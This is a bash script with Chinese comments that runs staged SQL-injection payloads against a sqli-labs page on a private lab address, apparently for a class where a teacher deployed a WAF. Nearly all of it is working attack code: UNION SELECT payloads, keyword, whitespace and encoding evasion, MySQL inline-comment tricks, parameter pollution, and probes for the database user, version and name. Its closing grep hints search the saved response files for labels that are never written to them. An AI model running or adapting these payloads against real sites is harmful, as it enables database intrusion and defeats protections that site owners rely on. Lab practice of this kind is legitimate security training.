#!/bin/bash
# ============================================================
# WAF Fuzz 测试工具 — SQL Injection Bypass 探测脚本
# 目标: http://172.19.19.111/sql/Less-2/?id=0
# 前置条件：老师部署了 WAF 防护
# 用法: bash waf_fuzz.sh
# ============================================================

TARGET="http://172.19.19.111/sql/Less-2/"
RESULT_DIR="./waf_fuzz_results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
mkdir -p "$RESULT_DIR"

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}============================================${NC}"
echo -e "${BLUE}  WAF Fuzz 测试 - SQL注入绕过探测          ${NC}"
echo -e "${BLUE}  目标: $TARGET                            ${NC}"
echo -e "${BLUE}  时间: $(date)                            ${NC}"
echo -e "${BLUE}============================================${NC}"

# ============================================================
# 阶段 1: 基线测试 — 确认 WAF 存在性
# ============================================================
echo -e "\n${YELLOW}[阶段 1] 基线测试 — 确认 WAF 行为${NC}"

test_request() {
    local desc="$1"
    local url="$2"
    local output_file="$3"

    local result=$(curl -s -o "$output_file" -w "HTTP_CODE:%{http_code}|SIZE:%{size_download}|TIME:%{time_total}" --connect-timeout 5 --max-time 10 "$url" 2>/dev/null)
    local http_code=$(echo "$result" | grep -oP 'HTTP_CODE:\K[0-9]+')
    local size=$(echo "$result" | grep -oP 'SIZE:\K[0-9]+')
    local time=$(echo "$result" | grep -oP 'TIME:\K[0-9.]+')

    # 判断是否被WAF拦截: 状态码不同 / body大小显著不同 / 响应时间异常短
    if [ "$http_code" != "200" ]; then
        echo -e "${RED}[BLOCKED]${NC} $desc → HTTP $http_code, Size: $size"
        return 1
    elif [ "$size" -lt 50 ]; then
        echo -e "${RED}[BLOCKED]${NC} $desc → HTTP $http_code, Size: $size (响应过小)"
        return 1
    else
        echo -e "${GREEN}[ALLOWED]${NC} $desc → HTTP $http_code, Size: $size, Time: ${time}s"
        return 0
    fi
}

# 基线请求
test_request "正常请求 id=1" "${TARGET}?id=1" "$RESULT_DIR/01_normal.txt"
BASELINE_SIZE=$(wc -c < "$RESULT_DIR/01_normal.txt" 2>/dev/null || echo 0)

# 简单注入字符
test_request "单引号 id=1'" "${TARGET}?id=1'" "$RESULT_DIR/02_single_quote.txt"
test_request "双引号 id=1\"" "${TARGET}?id=1%22" "$RESULT_DIR/03_double_quote.txt"
test_request "and 1=1" "${TARGET}?id=1%20and%201=1" "$RESULT_DIR/04_and_1_1.txt"
test_request "or 1=1" "${TARGET}?id=1%20or%201=1" "$RESULT_DIR/05_or_1_1.txt"
test_request "union select 1,2,3" "${TARGET}?id=0%20union%20select%201,2,3" "$RESULT_DIR/06_union_basic.txt"
test_request "union select 1,2,3 -- " "${TARGET}?id=0%20union%20select%201,2,3--%20" "$RESULT_DIR/07_union_comment.txt"

# ============================================================
# 阶段 2: 关键字绕过 Fuzz
# ============================================================
echo -e "\n${YELLOW}[阶段 2] 关键字绕过测试${NC}"

# 2.1 UNION 绕过变体
echo -e "\n${BLUE}--- 2.1 UNION 关键字绕过 ---${NC}"

union_bypasses=(
    "大小写绕过:UNION%20SELECT%201,2,3"
    "混写绕过:uNiOn%20sElEcT%201,2,3"
    "注释绕过:UN/**/ION%20SE/**/LECT%201,2,3"
    "双写绕过:UNUNIONION%20SELSELECTECT%201,2,3"
    "编码绕过:union%0aselect%201,2,3"
    "Tab绕过:union%09select%201,2,3"
    "换行绕过:union%0d%0aselect%201,2,3"
    "加号绕过:union+select+1,2,3"
    "花括号绕过:{union}{select}%201,2,3"
    "反引号绕过:union%20`select`%201,2,3"
    "#号注释绕过:union%20select%201,2,3%23"
    "--+注释绕过:union%20select%201,2,3--+"
    "-- 注释绕过:union%20select%201,2,3--%20"
    ";%00截断:union%20select%201,2,3;%00"
)

for item in "${union_bypasses[@]}"; do
    desc="${item%%:*}"
    payload="${item#*:}"
    test_request "$desc" "${TARGET}?id=0%20${payload}" "$RESULT_DIR/union_${desc}.txt"
done

# 2.2 AND/OR 绕过变体
echo -e "\n${BLUE}--- 2.2 AND/OR 关键字绕过 ---${NC}"

and_bypasses=(
    "&&绕过:1%20%26%26%201=1"
    "||绕过:1%20%7C%7C%201=1"
    "注释绕过AND:a/**/nd%201=1"
    "双写AND:aanndd%201=1"
    "异或绕过:1%20xor%201=1"
    "取反绕过:1%20%7C%7C%20~1=~1"
)

for item in "${and_bypasses[@]}"; do
    desc="${item%%:*}"
    payload="${item#*:}"
    test_request "$desc" "${TARGET}?id=${payload}" "$RESULT_DIR/and_${desc}.txt"
done

# ============================================================
# 阶段 3: 空格绕过 Fuzz
# ============================================================
echo -e "\n${YELLOW}[阶段 3] 空格/运算符绕过测试${NC}"

space_bypasses=(
    "注释代替空格 id=0/**/union/**/select/**/1,2,3" "${TARGET}?id=0/**/union/**/select/**/1,2,3"
    "Tab代替空格 id=0%09union%09select%091,2,3" "${TARGET}?id=0%09union%09select%091,2,3"
    "换行代替空格 id=0%0aunion%0aselect%0a1,2,3" "${TARGET}?id=0%0aunion%0aselect%0a1,2,3"
    "回车代替空格 id=0%0d%0aunion%0d%0aselect%0d%0a1,2,3" "${TARGET}?id=0%0d%0aunion%0d%0aselect%0d%0a1,2,3"
    "加号代替空格 id=0+union+select+1,2,3" "${TARGET}?id=0+union+select+1,2,3"
    "括号消除空格 id=0)union(select(1,2,3" "${TARGET}?id=0)union(select(1,2,3"
)

# 用循环遍历
idx=0
while [ $idx -lt ${#space_bypasses[@]} ]; do
    desc="${space_bypasses[$idx]}"
    url="${space_bypasses[$((idx+1))]}"
    safe_desc=$(echo "$desc" | tr ' /?=&' '_')
    test_request "$desc" "$url" "$RESULT_DIR/space_${safe_desc}.txt"
    idx=$((idx+2))
done

# ============================================================
# 阶段 4: 等号与比较符绕过
# ============================================================
echo -e "\n${YELLOW}[阶段 4] 比较运算符绕过测试${NC}"

eq_bypasses=(
    "like绕过 and 1 like 1" "${TARGET}?id=1%20and%201%20like%201"
    "in绕过 and 1 in (1)" "${TARGET}?id=1%20and%201%20in(1)"
    "between绕过 and 1 between 0 and 2" "${TARGET}?id=1%20and%201%20between%200%20and%202"
    "不等于绕过 and not 1<>1" "${TARGET}?id=1%20and%20not%201<>1"
    "regexp绕过 and 1 regexp 1" "${TARGET}?id=1%20and%201%20regexp%201"
    "大于小于绕过 id=1 and 1>0" "${TARGET}?id=1%20and%201>0"
)

idx=0
while [ $idx -lt ${#eq_bypasses[@]} ]; do
    desc="${eq_bypasses[$idx]}"
    url="${eq_bypasses[$((idx+1))]}"
    safe_desc=$(echo "$desc" | tr ' /?=&' '_')
    test_request "$desc" "$url" "$RESULT_DIR/eq_${safe_desc}.txt"
    idx=$((idx+2))
done

# ============================================================
# 阶段 5: 函数与特殊字符绕过
# ============================================================
echo -e "\n${YELLOW}[阶段 5] 函数与字符串绕过测试${NC}"

func_bypasses=(
    "hex编码 id=0 union select 1,hex(2),3" "${TARGET}?id=0%20union%20select%201,hex(2),3"
    "char编码 id=0 union select char(49),char(50),char(51)" "${TARGET}?id=0%20union%20select%20char(49),char(50),char(51)"
    "concat拼接 id=0 union select 1,concat(2),3" "${TARGET}?id=0%20union%20select%201,concat(2),3"
    "user()函数 id=0 union select 1,user(),3" "${TARGET}?id=0%20union%20select%201,user(),3"
    "version()函数 id=0 union select 1,version(),3" "${TARGET}?id=0%20union%20select%201,version(),3"
    "database()函数 id=0 union select 1,database(),3" "${TARGET}?id=0%20union%20select%201,database(),3"
)

idx=0
while [ $idx -lt ${#func_bypasses[@]} ]; do
    desc="${func_bypasses[$idx]}"
    url="${func_bypasses[$((idx+1))]}"
    safe_desc=$(echo "$desc" | tr ' /?=&(),' '_')
    test_request "$desc" "$url" "$RESULT_DIR/func_${safe_desc}.txt"
    idx=$((idx+2))
done

# ============================================================
# 阶段 6: 编码绕过
# ============================================================
echo -e "\n${YELLOW}[阶段 6] 编码绕过测试${NC}"

encode_bypasses=(
    "URL二次编码 id=0%2520union%2520select%25201,2,3" "${TARGET}?id=0%2520union%2520select%25201,2,3"
    "Unicode编码 union=u%006eion" "${TARGET}?id=0%20u%006eion%20sel%0063ct%201,2,3"
    "十六进制字符串 id=0 union select 1,0x61646d696e,3" "${TARGET}?id=0%20union%20select%201,0x61646d696e,3"
    "双URL编码 %25%37%35... id=0%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33" "${TARGET}?id=0%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33"
)

idx=0
while [ $idx -lt ${#encode_bypasses[@]} ]; do
    desc="${encode_bypasses[$idx]}"
    url="${encode_bypasses[$((idx+1))]}"
    safe_desc=$(echo "$desc" | tr ' /?=&(),%' '_')
    test_request "$desc" "$url" "$RESULT_DIR/encode_${safe_desc}.txt"
    idx=$((idx+2))
done

# ============================================================
# 阶段 7: 内联注释与数据库特性
# ============================================================
echo -e "\n${YELLOW}[阶段 7] 数据库特性绕过测试${NC}"

db_bypasses=(
    "Mysql内联注释 /*!union*/ select" "${TARGET}?id=0%20/*!union*/%20/*!select*/%201,2,3"
    "内联注释+版本 /*!50000union*/" "${TARGET}?id=0%20/*!50000union*/%20/*!50000select*/%201,2,3"
    "%23注释 id=0%20union%20select%201,2,3%23" "${TARGET}?id=0%20union%20select%201,2,3%23"
    "--空格注释" "${TARGET}?id=0%20union%20select%201,2,3--%20"
    ";%00截断" "${TARGET}?id=0%20union%20select%201,2,3;%00"
    "union%23注释%0a 换行" "${TARGET}?id=0%20union%23%0aselect%201,2,3"
)

idx=0
while [ $idx -lt ${#db_bypasses[@]} ]; do
    desc="${db_bypasses[$idx]}"
    url="${db_bypasses[$((idx+1))]}"
    safe_desc=$(echo "$desc" | tr ' /?=&(),%#*' '_')
    test_request "$desc" "$url" "$RESULT_DIR/db_${safe_desc}.txt"
    idx=$((idx+2))
done

# ============================================================
# 阶段 8: 高阶绕过技术
# ============================================================
echo -e "\n${YELLOW}[阶段 8] 高阶绕过测试${NC}"

advanced_bypasses=(
    "缓冲区溢出 id=0" "${TARGET}?id=0%20and%20(select%201%20from%20(select(0))a)%20union%20select%201,2,3&id=1&id=2&id=3&id=4&id=5&id=6&id=7&id=8&id=9&id=10&id=11&id=12&id=13&id=14&id=15&id=16&id=17&id=18&id=19&id=20&id=21&id=22&id=23&id=24&id=25"
    "HTTP参数污染(HPP)" "${TARGET}?id=0&id=union&id=select&id=1,2,3"
    "参数大小写污染" "${TARGET}?Id=0&ID=1&iD=2"
    "Content-Type绕过 POST" "${TARGET}?id=0%20union%20select%201,2,3"
    "%00绕过" "${TARGET}?id=0%00%20union%20select%201,2,3"
    "科学计数法 id=0e0 union select" "${TARGET}?id=0e0union%20select%201,2,3"
)

idx=0
while [ $idx -lt ${#advanced_bypasses[@]} ]; do
    desc="${advanced_bypasses[$idx]}"
    url="${advanced_bypasses[$((idx+1))]}"
    safe_desc=$(echo "$desc" | tr ' /?=&(),%#*' '_')
    test_request "$desc" "$url" "$RESULT_DIR/adv_${safe_desc}.txt"
    idx=$((idx+2))
done

# ============================================================
# 结果汇总
# ============================================================
echo -e "\n${YELLOW}============================================${NC}"
echo -e "${YELLOW}  Fuzz 测试完成！结果汇总                   ${NC}"
echo -e "${YELLOW}============================================${NC}"
echo ""
echo "原始响应文件保存在: $RESULT_DIR/"
echo ""
echo "=== 各阶段测试数量 ==="
echo "阶段1 基线测试: 7 项"
echo "阶段2 UNION关键字绕过: ${#union_bypasses[@]} 项"
echo "阶段2 AND/OR关键字绕过: ${#and_bypasses[@]} 项"
echo "阶段3 空格绕过: 6 项"
echo "阶段4 比较符绕过: 6 项"
echo "阶段5 函数绕过: 6 项"
echo "阶段6 编码绕过: 4 项"
echo "阶段7 数据库特性绕过: 6 项"
echo "阶段8 高阶绕过: 6 项"
echo ""
echo "=== 手动检查命令 ==="
echo "查看允许通过的请求: grep -l ALLOWED $RESULT_DIR/*.txt"
echo "查看被拦截的请求: grep -l BLOCKED $RESULT_DIR/*.txt"
echo ""
echo "=== 手动分析响应内容 ==="
echo "查看页面内容: cat $RESULT_DIR/01_normal.txt | head -50"
echo "查看拦截页面: cat $RESULT_DIR/02_single_quote.txt | head -50"
echo "比对正常与拦截页差异: diff <(cat $RESULT_DIR/01_normal.txt) <(cat $RESULT_DIR/02_single_quote.txt)"
echo ""
echo -e "${GREEN}脚本执行完毕！${NC}"
